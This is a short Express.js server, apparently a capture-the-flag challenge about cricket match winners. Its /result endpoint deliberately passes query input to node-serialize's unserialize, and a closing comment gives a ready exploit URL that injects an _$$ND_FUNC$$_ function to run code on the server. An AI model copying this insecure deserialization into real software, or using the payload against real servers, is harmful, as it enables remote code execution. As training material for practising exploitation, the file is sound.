const express = require('express')
const JSONParser = require('node-serialize')
const fs = require('fs')
const path = require('path')

const app = express()
const PORT = 3000

process.env.CSKVSKKR_Winner = 'CSK'
process.env.RCBVSSRH_Winner = 'RCB'


app.listen(PORT, error => {
    if(!error)
        console.log("Server is Successfully Running, and App is listening on port "+ PORT)
    else{ 
        console.error("Error occured, server can't start", error);
    }
})
app.get('/scoreboard', (req, res) => {
    res.sendFile(path.join(__dirname, '/pages/scoreboard.html'))
})

app.get('/result', (req, res) => {
    console.log(req.query.queryString)
    const reqObj = JSONParser.unserialize(`${req.query.queryString}`)
    
    const winner = reqObj.matchCode === 'CSKVSKKR' ? process.env.CSKVSKKR_Winner : process.env.RCBVSSRH_Winner
    if (winner === 'KKR'){
        return res.send({
            winner : winner,
            flag : "fff"
        })
        fs.readFile('./flag.txt', (err, data) => {
            return res.send({
                winner : winner,
                flag : "fff"
            })
        })
    }
    return res.send({
        winner : winner,
        flag : ""
    })
})
//http://localhost:3000/result?queryString={%22matchCode%22:%22CSKVSKKR%22,%22c%22:%22_$$ND_FUNC$$_function(){process.env.CSKVSKKR_Winner%20=%20%27KKR%27}()%22}